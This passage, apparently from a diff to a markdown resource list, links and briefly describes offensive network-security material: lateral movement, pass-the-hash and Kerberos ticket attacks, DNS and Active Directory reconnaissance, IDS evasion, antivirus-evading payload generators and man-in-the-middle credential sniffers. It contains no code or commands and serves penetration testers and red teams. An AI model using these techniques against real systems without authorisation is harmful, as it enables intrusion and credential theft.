+- [RFC 5246 - The Transport Layer Security (TLS) Protocol Version 1.2](https://tools.ietf.org/html/rfc5246)
+- [TCPDump Command Examples](http://www.thegeekstuff.com/2010/08/tcpdump-command-examples/)
+- [The Eavesdropper’s Dillemma](http://www.crypto.com/papers/internet-tap.pdf)
+- [Strange Attractors and TCP/IP Sequence Number Analysis - Michal Zalewski](http://lcamtuf.coredump.cx/oldtcp/tcpseq.html)
+
+### Attacking Windows Networks
+
+* [Introducing PowerShell into your Arsenal with PS>Attack - Jared Haight](http://www.irongeek.com/i.php?page=videos/derbycon6/119-introducing-powershell-into-your-arsenal-with-psattack-jared-haight)
+* [Get-Help: An Intro to PowerShell and How to Use it for Evil - Jared Haight](https://www.psattack.com/presentations/get-help-an-intro-to-powershell-and-how-to-use-it-for-evil/)
+* [ShareCheck Windows Enumeration Tool v2.0 - sec1](http://www.sec-1.com/blog/2014/sharecheck)
+
+### Lateral Movement
+
+* [_Puff_ _Puff_ PSExec - Lateral Movement: An Overview](https://www.toshellandback.com/2017/02/11/psexec/)
+* [Ditch PsExec, SprayWMI is here ;)](http://www.pentest.guru/index.php/2015/10/19/ditch-psexec-spraywmi-is-here/)
+* [WMIOps](https://github.com/ChrisTruncer/WMIOps)
+
+  * WMIOps is a powershell script that uses WMI to perform a variety of actions
+    on hosts, local or remote, within a Windows environment. It's designed
+    primarily for use on penetration tests or red team engagements.
+
+* [spraywmi](https://github.com/trustedsec/spraywmi)
+
+  * SprayWMI is a method for mass spraying Unicorn PowerShell injection to CIDR
+    notations.
+
+* [psexec](https://github.com/pentestgeek/smbexec)
+
+  * A rapid psexec style attack with samba tools
+
+* [Blogpost that inspired it](http://carnal0wnage.attackresearch.com/2012/01/psexec-fail-upload-and-exec-instead.html)
+* [sshuttle](https://github.com/apenwarr/sshuttle)
+
+  * Transparent proxy server that works as a poor man's VPN. Forwards over ssh.
+    Doesn't require admin. Works with Linux and MacOS. Supports DNS tunneling.
+
+* [PowerShell PSRemoting Pwnage](https://pentestn00b.wordpress.com/2016/08/22/powershell-psremoting-pwnage/)
+* [PowerShell Remoting for Penetration Testers ](https://lockboxx.blogspot.com/2015/07/powershell-remoting-for-penetration.html)
+
+### Pass-the-Hash
+
+* [Pass the hash - Wikipedia](https://en.wikipedia.org/wiki/Pass_the_hash)
+* [Pass the hash attacks: Tools and Mitigation - 2010 SANS paper](https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283)
+* [Performing Pass-the-Hash Attacks with Mimikatz](https://blog.stealthbits.com/passing-the-hash-with-mimikatz)
+* [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
+* [Still Passing the Hash 15 Years Later](https://passing-the-hash.blogspot.com/)
+
+  * Providing all the extra info that didn't make it into the BlackHat 2012 USA
+    Presentation "Still Passing the Hash 15 Years Later? Using the Keys to the
+    Kingdom to Access All Your Data" by Alva Lease 'Skip' Duckwall IV and
+    Christopher Campbell.
+
+* [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
+
+  * Invoke-TheHash contains PowerShell functions for performing pass the hash
+    WMI and SMB tasks. WMI and SMB services are accessed through .NET TCPClient
+    connections. Authentication is performed by passing an NTLM hash into the
+    NTLMv2 authentication protocol. Local administrator privilege is not
+    required client-side.
+
+### Passing the Ticket Attacks
+
+* [How To Pass the Ticket Through SSH Tunnels](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
+* [Mimikatz and Active Directory Kerberos Attacks ](https://adsecurity.org/?p=556)
+
+* Silver Tickets
+
+* [How Attackers Use Kerberos Silver Tickets to Exploit Systems](https://adsecurity.org/?p=2011)
+
+* Gold Tickets
+
+* [mimikatz - Golden Ticket](http://rycon.hu/papers/goldenticket.html)
+* [The Golden Ticket Attack - A Look Under The Hood](http://cybersecology.com/wp-content/uploads/2016/05/Golden_Ticket-v1.13-Final.pdf)
+* [Kerberos Golden Ticket Protection Mitigating Pass-the-Ticket on Active Directory - CERT-EU](https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf)
+* [The path to the Golden Ticket](https://countuponsecurity.com/tag/pass-the-ticket/)
+* [The Secret Life of KRBTGT](https://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf)
+* [From Pass-the-Hash to Pass-the-Ticket with No Pain](http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/)
+
+* RDP
+
+* [RDP hijacking-how to hijack RDS and RemoteApp sessions transparently to move through an organisation](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
+* [RDP Man-in-The-Middle attack ](https://theevilbit.blogspot.com/2014/04/rdp-man-in-middle-attack.html)
+* [ATTACKING RDP How to Eavesdrop on Poorly Secured RDP Connections - Adrian Vollmer 2017](https://www.exploit-db.com/docs/41621.pdf)
+* [RDPY](https://github.com/citronneur/rdpy)
+  * RDPY is a pure Python implementation of the Microsoft RDP (Remote Desktop
+    Protocol) protocol (client and server side). RDPY is built over the event
+    driven network engine Twisted. RDPY support standard RDP security layer, RDP
+    over SSL and NLA authentication (through ntlmv2 authentication protocol).
+* [SSL -Man-In-The-Middle- attacks on RDP](https://web.archive.org/web/20161007044945/https://labs.portcullis.co.uk/blog/ssl-man-in-the-middle-attacks-on-rdp/)
+* [rdps2rdp](https://github.com/DiabloHorn/rdps2rdp)
+
+  * Decrypt MITM SSL RDP and save to pcap
+  * Active Directory
+  * Check under privesc/postex for More info
+
+* [Active Directory - Wikipedia](https://en.wikipedia.org/wiki/Active_Directory)
+* [AD Security Active Directory Resources](https://adsecurity.org/?page_id=41)
+* [AD Reading: Active Directory Core Concepts](http://adsecurity.org/?p=15)
+* [AD Reading: Active Directory Authentication & Logon](http://adsecurity.org/?p=20)
+* [MS Network Level Authentication](https://technet.microsoft.com/en-us/magazine/hh750380.aspx)
+
+* Recon
+* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+
+  * PowerView is a PowerShell tool to gain network situational awareness on
+    Windows domains. It contains a set of pure-PowerShell replacements for
+    various windows "net \*" commands, which utilize PowerShell AD hooks and
+    underlying Win32 API functions to perform useful Windows domain
+    functionality.
+
+* [PowerShell-AD-Recon](https://github.com/PyroTek3/PowerShell-AD-Recon)
+
+  * AD PowerShell Recon Scripts
+
+* [Netview](https://github.com/mubix/netview)
+
+  * Netview is a enumeration tool. It uses (with the -d) the current domain or a
+    specified domain (with the -d domain) to enumerate hosts
+
+* [DomainTrustExplorer](https://github.com/sixdub/DomainTrustExplorer)
+
+  * Python script for analyis of the "Trust.csv" file generated by Veil
+    PowerView. Provides graph based analysis and output. The graph output will
+    represent access direction (opposite of trust direction)
+
+* Getting Credentials
+
+* [Dumping a Domain-s Worth of Passwords With Mimikatz pt. 2](http://www.harmj0y.net/blog/powershell/dumping-a-domains-worth-of-passwords-with-mimikatz-pt-2/)
+* [LLMNR and NBT-NS Poisoning Using Responder](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
+* [Attacking ADFS Endpoints with PowerShell](http://www.irongeek.com/i.php?page=videos/derbycon6/118-attacking-adfs-endpoints-with-powershell-karl-fosaaen)
+
+* Getting Domain Admin
+
+* [Attack Methods for Gaining Domain Admin Rights in Active Directory - hackingandsecurity](https://hackingandsecurity.blogspot.com/2017/07/attack-methods-for-gaining-domain-admin.html?view=timeslide)
+* Kerberos
+* [Abusing Kerberos](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It-wp.pdf)
+* [krb5-enum-users - nse script](https://nmap.org/nsedoc/scripts/krb5-enum-users.html)
+
+  * Discovers valid usernames by brute force querying likely usernames against a
+    Kerberos service. When an invalid username is requested the server will
+    respond using the Kerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN,
+    allowing us to determine that the user name was invalid. Valid user names
+    will illicit either the TGT in a AS-REP response or the error
+    KRB5KDC_ERR_PREAUTH_REQUIRED, signaling that the user is required to perform
+    pre authentication.
+
+* Slides
+
+* [Windows Attacks AT is the new black](https://www.slideshare.net/mubix/windows-attacks-at-is-the-new-black-26665607)
+
+* Tools
+
+* [Responder](https://github.com/SpiderLabs/Responder/)
+
+  * Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in
+    HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting
+    NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication.
+
+- [Enum4Linux](https://labs.portcullis.co.uk/tools/enum4linux/)
+
+  * Enum4linux is a tool for enumerating information from Windows and Samba
+    systems. It attempts to offer similar functionality to enum.exe formerly
+    available from www.bindview.com. It is written in Perl and is basically a
+    wrapper around the Samba tools smbclient, rpclient, net and nmblookup. The
+    tool usage can be found below followed by examples, previous versions of the
+    tool can be found at the bottom of the page.
+
+- Sharepoint
+
+- [MS Sharepoint - Wikipedia](https://en.wikipedia.org/wiki/SharePoint)
+- Tools
+- [Sparty - MS Sharepoint and Frontpage Auditing Tool](http://sparty.secniche.org/)
+
+  * Sparty is an open source tool written in python to audit web applications
+    using sharepoint and frontpage architecture. The motivation behind this tool
+    is to provide an easy and robust way to scrutinize the security
+    configurations of sharepoint and frontpage based web applications. Due to
+    the complex nature of these web administration software, it is required to
+    have a simple and efficient tool that gathers information, check access
+    permissions, dump critical information from default files and perform
+    automated exploitation if security risks are identified. A number of
+    automated scanners fall short of this and Sparty is a solution to that.
+
+- [SPScan](http://sourceforge.net/projects/spscan/)
+
+  * SPScan is a tool written in Ruby that enumerates a SharePoint installation
+    gathering information about the version and installed plugins.
+
+- [SPartan](https://github.com/sensepost/SPartan)
+
+  * SPartan is a Frontpage and Sharepoint fingerprinting and attack tool
+
+### General Tools
+
+* [Yersinia](http://www.yersinia.net/)
+
+  * Yersinia is a network tool designed to take advantage of some weakeness in
+    different network protocols. It pretends to be a solid framework for
+    analyzing and testing the deployed networks and systems.
+
+* [netcat](http://nc110.sourceforge.net/)
+
+  * Network Swiss army knife. Ncat-s predecessor. Does everything and the
+    kitchen sink.
+
+* [Ncat](http://nmap.org/)
+
+  * Ncat is a feature-packed networking utility which reads and writes data
+    across networks from the command line. Ncat was written for the Nmap Project
+    as a much-improved reimplementation of the venerable Netcat. It uses both
+    TCP and UDP for communication and is designed to be a reliable back-end tool
+    to instantly provide network connectivity to other applications and users.
+    Ncat will not only work with IPv4 and IPv6 but provides the user with a
+    virtually limitless number of potential uses.
+
+* [RANCID - Really Awesome New Cisco confIg Differ](http://www.shrubbery.net/rancid/)
+
+  * RANCID monitors a router's (or more generally a device's) configuration,
+    including software and hardware (cards, serial numbers, etc) and uses CVS
+    (Concurrent Version System) or Subversion to maintain history of changes.
+    RANCID does this by the very simple process summarized as: login to each
+    device in the router table (router.db), run various commands to get the
+    information that will be saved, cook the output; re-format, remove
+    oscillating or incrementing data, email any differences (sample) from the
+    previous collection to a mail list, and finally commit those changes to the
+    revision control system
+
+#### Apache ActiveMQ
+
+* [a](https://github.com/fmtn/a)
+
+  * ActiveMQ CLI testing and message management
+
+* [Apache ActiveMQ - Wikipedia](https://en.wikipedia.org/wiki/Apache_ActiveMQ)
+* [ActiveMQ](http://activemq.apache.org/)
+* [Getting Started](http://activemq.apache.org/getting-started.html)
+* [What is ActiveMQ used for? - StackOverflow](https://stackoverflow.com/questions/12805377/what-is-activemq-used-for)
+
+#### BitSquatting:
+
+* [DEFCON 19: Bit-squatting: DNS Hijacking Without Exploitation (w speaker)](https://www.youtube.com/watch?v=aT7mnSstKGs)
+* [Bitsquatting - DNS Hijacking without Exploitation - Artem Dinaburg](https://media.blackhat.com/bh-us-11/Dinaburg/BH_US_11_Dinaburg_Bitsquatting_WP.pdf)
+* [Blogpost - Bitsquatting: DNS Hijacking without exploitation](http://dinaburg.org/bitsquatting.html)
+* [Bitsquatting - benjaminpetrin](https://github.com/benjaminpetrin/bitsquatting)
+
+  * This repository includes a simple toy DNS server written in Python3 for use
+    in conducting research in bitsquatting (bitsquat_dns.py). It also includes a
+    helper script for generating the necessary permutations of a domain
+    (domain_gen.py). The remainder of this README includes further documentation
+    of the included DNS server, and a brief summary of my results running this
+    on the web for a period in 2015.
+
+* [Bitsquatting: Exploiting Bit-flips for Fun, or Profit?](http://www.securitee.org/files/bitsquatting_www2013.pdf)
+* [digbit](https://github.com/mnmnc/digbit/blob/master/README.md)
+
+  * Automatic domain generation for BitSquatting
+
+#### DNS:
+
+* Attacks
+
+* [DNS Cache Snooping or Snooping the Cache for Fun and Profit - Luis Grangeia](http://cs.unc.edu/~fabian/course_papers/cache_snooping.pdf)
+* [DNS Dark Matter Discovery Theres Evil In Those Queries - Jim Nitterauer](https://www.youtube.com/watch?v=-A2Wqagz73Y)
+* [DNS hijacking using cloud providers - Frans Ros-n](https://www.youtube.com/watch?v=HhJv8CU-RIk)
+* [Enumerating DNSSEC NSEC and NSEC3 Records](https://www.altsci.com/concepts/page.php?s=dnssec&p=1)
+* [DNS database espionage](http://dnscurve.org/espionage2.html)
+* [DNS May Be Hazardous to Your Health - Robert Stucke](https://www.youtube.com/watch?v=ZPbyDSvGasw)
+
+  * Great talk on attacking DNS
+
+* [A penetration tester’s guide to sub-domain enumeration](https://blog.appsecco.com/a-penetration-testers-guide-to-sub-domain-enumeration-7d842d5570f6)
+* [Secrets of DNS Ron Bowes - Derbycon4](https://www.youtube.com/watch?v=MgO-gPiVTSc)
+
+* Educational
+
+* [DNS RFC - Domain Name System RFC's (IETF)](http://www.bind9.net/rfc)
+* [RFC 1034 - DOMAIN NAMES - CONCEPTS AND FACILITIES](https://www.ietf.org/rfc/rfc1034.txt)
+* [RFC 1035 - DOMAIN NAMES - IMPLEMENTATION AND SPECIFICATION](https://www.ietf.org/rfc/rfc1035.txt)
+* [DNS Reference Information - technet](<https://technet.microsoft.com/en-us/library/dd197499(v=ws.10).aspx>)
+* [DNS Records: an Introduction](https://www.linode.com/docs/networking/dns/dns-records-an-introduction)
+* SubDomain
+
+* [Sub-domain enumeration - Reference](https://gist.github.com/yamakira/2a36d3ae077558ac446e4a89143c69ab)
+* [Altdns](https://github.com/infosec-au/altdns)
+
+  * Altdns is a DNS recon tool that allows for the discovery of subdomains that
+    conform to patterns. Altdns takes in words that could be present in
+    subdomains under a domain (such as test, dev, staging) as well as takes in a
+    list of subdomains that you know of.
+
+* [AQUATONE](https://github.com/michenriksen/aquatone)
+
+  * AQUATONE is a set of tools for performing reconnaissance on domain names. It
+    can discover subdomains on a given domain by using open sources as well as
+    the more common subdomain dictionary brute force approach. After subdomain
+    discovery, AQUATONE can then scan the hosts for common web ports and HTTP
+    headers, HTML bodies and screenshots can be gathered and consolidated into a
+    report for easy analysis of the attack surface.
+
+* [Sublist3r](https://github.com/aboul3la/Sublist3r)
+
+  * Fast subdomains enumeration tool for penetration testers
+
+* [dns-parallel-prober](https://github.com/lorenzog/dns-parallel-prober)
+
+  * This script is a proof of concept for a parallelised domain name prober. It
+    creates a queue of threads and tasks each one to probe a sub-domain of the
+    given root domain. At every iteration step each dead thread is removed and
+    the queue is replenished as necessary.
+
+* [enumall](https://github.com/Dhayalan96/enumall)
+
+  * Script to enumerate subdomains, leveraging recon-ng. Uses google scraping,
+    bing scraping, baidu scraping, yahoo scarping, netcraft, and bruteforces to
+    find subdomains. Plus resolves to IP.
+
+* [Knockpy](https://github.com/guelfoweb/knock)
+
+  * Knockpy is a python tool designed to enumerate subdomains on a target domain
+    through a wordlist. It is designed to scan for DNS zone transfer and to try
+    to bypass the wildcard DNS record automatically if it is enabled.
+
+* [sub6](https://github.com/YasserGersy/sub6)
+
+  * subdomain take over detector and crawler
+
+* Service
+
+* [DNS Dumpster](DNSdumpster.com)
+
+  * free domain research tool that can discover hosts related to a domain.
+    Finding visible hosts from the attackers perspective is an important part of
+    the security assessment process
+
+* Tools
+
+* [DNSRecon](https://github.com/darkoperator/dnsrecon)
+* [Quick Reference Guide](http://pentestlab.wordpress.com/2012/11/13/dns-reconnaissance-dnsrecon/)
+* [dns-discovery](https://github.com/mafintosh/dns-discovery)
+
+  * Discovery peers in a distributed system using regular dns and multicast dns.
+
+* [TXTDNS](http://www.txdns.net/)
+
+  * TXDNS is a Win32 aggressive multithreaded DNS digger. Capable of placing, on
+    the wire, thousands of DNS queries per minute. TXDNS main goal is to expose
+    a domain namespace trough a number of techniques: Typos: Mised, doouble and
+    transposde keystrokes; TLD/ccSLD rotation; Dictionary attack; Full
+    Brute-force attack using alpha, numeric or alphanumeric charsets; Reverse
+    grinding.
+
+* [nsec3map](https://github.com/anonion0/nsec3map)
+
+  * a tool to enumerate the resource records of a DNS zone using its DNSSEC NSEC
+    or NSEC3 chain
+
+* [passivedns](https://github.com/gamelinux/passivedns)
+
+  * A tool to collect DNS records passively
+
+* [DNS Recon](https://github.com/darkoperator/dnsrecon)
+* [DNSEnum](https://github.com/fwaeytens/dnsenum)
+
+  * Multithreaded perl script to enumerate DNS information of a domain and to
+    discover non-contiguous ip blocks.
+
+### D/DOS
+
+* [Denial-of-service attack - Wikipedia](https://en.wikipedia.org/wiki/Denial-of-service_attack)
+* [Davoset](https://github.com/MustLive/DAVOSET)
+
+  * DAVOSET - it is console (command line) tool for conducting DDoS attacks on
+    the sites via Abuse of Functionality and XML External Entities
+    vulnerabilities at other sites.
+
+### Frameworks
+
+* [BackDoor Factory](https://github.com/secretsquirrel/the-backdoor-factory)
+
+  * The goal of BDF is to patch executable binaries with user desired shellcode
+    and continue normal execution of the prepatched state.
+  * [Wiki](https://github.com/secretsquirrel/the-backdoor-factory/wiki)
+  * [Video](http://www.youtube.com/watch?v=jXLb2RNX5xs)
+
+* [Man-in-the-Middle Framework](https://github.com/byt3bl33d3r/MITMf)
+
+  * Framework for Man-In-The-Middle attacks
+
+* [Veil](https://github.com/Veil-Framework/Veil)
+
+  * Veil is a tool designed to generate metasploit payloads that bypass common
+    anti-virus solutions.
+  * [Framework Usage Tutorial](https://www.veil-framework.com/veil-tutorial/)
+  * [Payload Creation Tutorial](https://www.veil-framework.com/tutorial-veil-payload-development/)
+  * [Customizing backdoors with Veil](https://www.veil-framework.com/how-to-customize-backdoor-factory-payloads-within-veil/)
+  * [Creating a windows payload](https://www.youtube.com/watch?v=v1OXNP_bl8U)
+  * [Adventures in Asymmetric Warfare by Will Schroeder](https://www.youtube.com/watch?v=53qQfCkVM_o)
+
+### ICMP
+
+* [ICMP RFC - Network Sorcery](http://www.networksorcery.com/enp/protocol/icmp.htm)
+* [RFC 792 - Internet Control Message Protocol](https://tools.ietf.org/html/rfc792)
+* [Internet Control Message Protocol - Wikipedia](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol)
+* [BlackNurse attack PoC](https://github.com/jedisct1/blacknurse)
+
+  * A simple PoC for the Blacknurse attack. "Blacknurse is a low bandwidth ICMP
+    attack that is capable of doing denial of service to well known firewalls".
+
+### IDS/IPS Evasion
+
+* [Intrusion Detection System](https://en.wikipedia.org/wiki/Intrusion_detection_system)
+* [Intrusion detection evasion: How Attackers get past the burglar alarm](http://www.sans.org/reading-room/whitepapers/detection/intrusion-detection-evasion-attackers-burglar-alarm-1284)
+
+  * The purpose of this paper is to show methods that attackers can use to fool
+    IDS systems into thinking their attack is legitimate traffic. With
+    techniques like obfuscation, fragmentation, Denial of Service, and
+    application hijacking the attacker can pass traffic under the nose of an IDS
+    to prevent their detection. These are techniques that the next generation of
+    IDS needs to be able to account for and prevent. Since it would be almost
+    impossible to create a product that was not vulnerable to one of these
+    deceptions.
+
+* [Beating the IPS](http://www.sans.org/reading-room/whitepapers/intrusion/beating-ips-34137)
+
+  * This paper introduces various Intrusion Prevention System (IPS) evasion
+    techniques and shows how they can be used to successfully evade detection by
+    widely used products from major security vendors. By manipulating the
+    header, payload, and traffic flow of a well-known attack, it is possible to
+    trick the IPS inspection engines into passing the traffic - allowing the
+    attacker shell access to the target system protected by the IPS.
+
+* [Firewall/IDS Evasion and Spoofing](https://nmap.org/book/man-bypass-firewalls-ids.html)
+* [IDS/IPS Evasion Techniques - Alan Neville](http://www.redbrick.dcu.ie/~anev/IDS_IPS_Evasion_Techniques.pdf)
+* [Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection](http://insecure.org/stf/secnet_ids/secnet_ids.html)
+* [Evading IDS/IPS by Exploiting IPv6 Features - Antonios Atlasis, Rafael Schaefer](https://www.youtube.com/watch?v=avMeYIaU8DA&list=PL1eoQr97VfJni4_O1c3kBCCWwxu-6-lqy)
+* [wafw00f](https://github.com/sandrogauci/wafw00f)
+
+  * WAFW00F allows one to identify and fingerprint Web Application Firewall
+    (WAF) products protecting a website.
+
+* [HTTP Evasions Explained - Part 6 - Attack of the White-Space](http://noxxi.de/research/http-evader-explained-6-whitespace.html)
+
+  * This is part six in a series which will explain the evasions done by HTTP
+    Evader. This part is about misusing white-space to bypass the firewall.
+
+* [Fire Away Sinking the Next Gen Firewall Russell Butturini - Derbycon6](https://www.youtube.com/watch?v=Qpty_f0Eu7Y)
+* [Passive IPS Reconnaissance and Enumeration - false positive (ab)use - Arron Finnon](https://vimeo.com/108775823)
+
+  * Network Intrusion Prevention Systems or NIPS have been plagued by "False
+    Positive" issues almost since their first deployment. A "False Positive"
+    could simply be described as incorrectly or mistakenly detecting a threat
+    that is not real. A large amount of research has gone into using "False
+    Positive" as an attack vector either to attack the very validity of an IPS
+    system or to conduct forms of Denial of Service attacks. However the very
+    reaction to a "False Positive" in the first place may very well reveal more
+    detailed information about defences than you might well think.
+
+* [Attacking Nextgen Firewalls](https://www.youtube.com/watch?v=ZoCf9yWC32g)
+* [Dalton](https://github.com/secureworks/dalton)
+
+  * Dalton is a system that allows a user to quickly and easily run network
+    packet captures ("pcaps") against an intrusion detection system ("IDS")
+    sensor of his choice (e.g. Snort, Suricata) using defined rulesets and/or
+    bespoke rules.
+
+### IP Spoofing
+
+* [State of IP Spoofing](https://spoofer.caida.org/summary.php)
+
+### IPMI
+
+* [Intelligent Platform Managment Interface Documentation - Intel](https://www.intel.com/content/www/us/en/servers/ipmi/ipmi-home.html)
+* [IPMI Basics](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)
+* [Intelligent Platform Management Interface - Wikipedia](https://en.wikipedia.org/wiki/Intelligent_Platform_Management_Interface)
+* [A Penetration Tester's Guide to IPMI and BMCs](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)
+* [OpenIPMI](http://openipmi.sourceforge.net/)
+* [Breaking IPMI/BMC](http://fish2.com/ipmi/how-to-break-stuff.html)
+* [IPMI – A Gentle Introduction with OpenIPMI](http://openipmi.sourceforge.net/IPMI.pdf)
+
+### IPv6 Related
+
+* [IPv6—101: Introduction - F5](http://securite.net.au/wp-content/uploads/2014/05/F5s-IPV6-Introduction.pdf)
+* [Introduction to IPv6 Fundamentals - Cisco](https://www.youtube.com/watch?v=PdGLmeq-6Bg)
+* [IPv6 - Wikipedia](https://en.wikipedia.org/wiki/IPv6)
+* [RFC 2460 - Internet Protocol, Version 6 (IPv6)](https://tools.ietf.org/html/rfc2460)
+
+* IPv6: Basic Attacks and Defences - Christopher Werny[TROOPERS15] _
+  [Part 1](https://www.youtube.com/watch?v=Y8kjQEGHbAU) _
+  [Part 2](https://www.youtube.com/watch?v=V-GYPp-j-lE)
+* [Exploiting Tomorrow's Internet Today: Penetration testing with IPv6](http://uninformed.org/?v=all&a=46&t=sumry)
+
+  * This paper illustrates how IPv6-enabled systems with link-local and
+    auto-configured addresses can be compromised using existing security tools.
+    While most of the techniques described can apply to "real" IPv6 networks,
+    the focus of this paper is to target IPv6-enabled systems on the local
+    network.
+
+* [IPv6 Toolkit](https://github.com/fgont/ipv6toolkit)
+
+  * SI6 Networks' IPv6 Toolkit
+
+* [THC-IPv6](https://www.thc.org/thc-ipv6/)
+
+  * A complete tool set to attack the inherent protocol weaknesses of IPV6 and
+    ICMP6, and includes an easy to use packet factory library.
+
+* [[TROOPERS15] Merike Kaeo - Deploying IPv6 Securely - Avoiding Mistakes Others Have Made](https://www.youtube.com/watch?v=rQg4y78xHf8)
+* [IPv6 Local Neighbor Discovery Using Router Advertisement](https://www.rapid7.com/db/modules/auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement)
+
+  * Send a spoofed router advertisement with high priority to force hosts to
+    start the IPv6 address auto-config. Monitor for IPv6 host advertisements,
+    and try to guess the link-local address by concatinating the prefix, and the
+    host portion of the IPv6 address. Use NDP host solicitation to determine if
+    the IP address is valid'
+
+* [IPv6 - Playing with IPv6 for fun and profit](https://github.com/zbetcheckin/IPv6)
+
+#### Kerberos
+
+* Kerberos
+
+#### LDAP
+
+* [Lightweight Directory Access Protocol - Wikipedia](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol)
+* [Basic LDAP Concepts - ldap.com](https://www.ldap.com/basic-ldap-concepts)
+* [Lightweight Directory Access Protocol (LDAP): Technical Specification Road Map](https://tools.ietf.org/html/rfc4510)
+* [Lightweight Directory Access Protocol (LDAP): The Protocol](https://tools.ietf.org/html/rfc4511)
+
+* Attacking
+
+* [Public Facing LDAP Enumeration](https://www.lanmaster53.com/2013/05/24/public-facing-ldap-enumeration/)
+* [Dangers of LDAP NULL Base and Bind](https://securitysynapse.blogspot.com/2013/09/dangers-of-ldap-null-base-and-bind.html)
+* Tools
+
+* [JXplorer](http://jxplorer.org/)
+
+  * JXplorer is a cross platform LDAP browser and editor. It is a standards
+    compliant general purpose LDAP client that can be used to search, read and
+    edit any standard LDAP directory, or any directory service with an LDAP or
+    DSML interface. It is highly flexible and can be extended and customised in
+    a number of ways. JXplorer is written in java, and the source code and Ant
+    build system are available via svn or as a packaged build for users who want
+    to experiment or further develop the program.
+
+* [LDAPMfINER](http://ldapminer.sourceforge.net/)
+
+  * This is a tool I wrote to collect information from different LDAP Server
+    implementation. This was written in C with the Netscape C
+
+* [Softera LDAP Browser](http://www.ldapbrowser.com/info_softerra-ldap-browser.htm)
+
+  * LDAP Browser that supports most LDAP implementations. Non-free software,
+    30-day free trial
+
+### MitM Tools
+
+* [Dsniff](http://www.monkey.org/~dugsong/dsniff/)
+
+  * dsniff is a collection of tools for network auditing and penetration
+    testing. dsniff, filesnarf, mailsnarf, msgsnarf, urlsnarf, and webspy
+    passively monitor a network for interesting data (passwords, e-mail, files,
+    etc.). arpspoof, dnsspoof, and macof facilitate the interception of network
+    traffic normally unavailable to an attacker (e.g, due to layer-2 switching).
+    sshmitm and webmitm implement active monkey-in-the-middle attacks against
+    redirected SSH and HTTPS sessions by exploiting weak bindings in ad-hoc PKI.
+
+- [Ettercap](https://ettercap.github.io/ettercap/)
+
+  * Ettercap is a comprehensive suite for man in the middle attacks. It features
+    sniffing of live connections, content filtering on the fly and many other
+    interesting tricks. It supports active and passive dissection of many
+    protocols and includes many features for network and host analysis.
+
+- [net-creds](https://github.com/DanMcInerney/net-creds)
+
+  * Thoroughly sniff passwords and hashes from an interface or pcap file.
+    Concatenates fragmented packets and does not rely on ports for service
+    identification. It sniffs: URLs visited; POST loads sent; HTTP form
+    logins/passwords; HTTP basic auth logins/passwords; HTTP searches; FTP
+    logins/passwords; IRC logins/passwords; POP logins/passwords; IMAP
+    logins/passwords; Telnet logins/passwords; SMTP logins/passwords; SNMP
+    community string; NTLMv1/v2 all supported protocols like HTTP, SMB, LDAP,
+    etc; Kerberos.
+
+- RDP
+
+- [Seth](https://github.com/SySS-Research/Seth)
+
+  * Seth is a tool written in Python and Bash to MitM RDP connections. It
+    attempts to downgrade the connection and extract clear text credentials.
+
+- NTLM/SMB/NTBS
+
+- [NTLMssp-Extract](https://github.com/sinnaj-r/NTLMssp-Extract)
+
+  * A small Python-Script to extract NetNTLMv2 Hashes from
+    NTMLssp-HTTP-Authentications, which were captured in a pcap.
+
+- [ntlmRelayToEWS](https://github.com/Arno0x/NtlmRelayToEWS)
+
+  * ntlmRelayToEWS is a tool for performing ntlm relay attacks on Exchange Web
+    Services (EWS). It spawns an SMBListener on port 445 and an HTTPListener on
+    port 80, waiting for incoming connection from the victim. Once the victim
+    connects to one of the listeners, an NTLM negociation occurs and is relayed
+    to the target EWS server.
+
+- SSL/TLS
+
+- [SSLsplit - transparent and scalable SSL/TLS interception](https://www.roe.ch/SSLsplit)
+
+  * SSLsplit is a tool for man-in-the-middle attacks against SSL/TLS encrypted
+    network connections. Connections are transparently intercepted through a
+    network address translation engine and redirected to SSLsplit. SSLsplit
+    terminates SSL/TLS and initiates a new SSL/TLS connection to the original
+    destination address, while logging all data transmitted. SSLsplit is
+    intended to be useful for network forensics and penetration testing.
+    SSLsplit supports plain TCP, plain SSL, HTTP and HTTPS connections over both
+    IPv4 and IPv6.
+
+- [SSLStrip](http://www.thoughtcrime.org/software/sslstrip/)
+
+  * This tool provides a demonstration of the HTTPS stripping attacks that I
+    presented at Black Hat DC 2009. It will transparently hijack HTTP traffic on
+    a network, watch for HTTPS links and redirects, then map those links into
+    either look-alike HTTP links or homograph-similar HTTPS links. It also
+    supports modes for supplying a favicon which looks like a lock icon,
+    selective logging, and session denial.
+
+- WSUS(Windows Server Updater Serice)
+- [WSUXploit](https://github.com/pimps/wsuxploit)
+
+  * This is a MiTM weaponized exploit script to inject 'fake' updates into
+    non-SSL WSUS traffic. It is based on the WSUSpect Proxy application that was
+    introduced to public on the Black Hat USA 2015 presentation, 'WSUSpect -
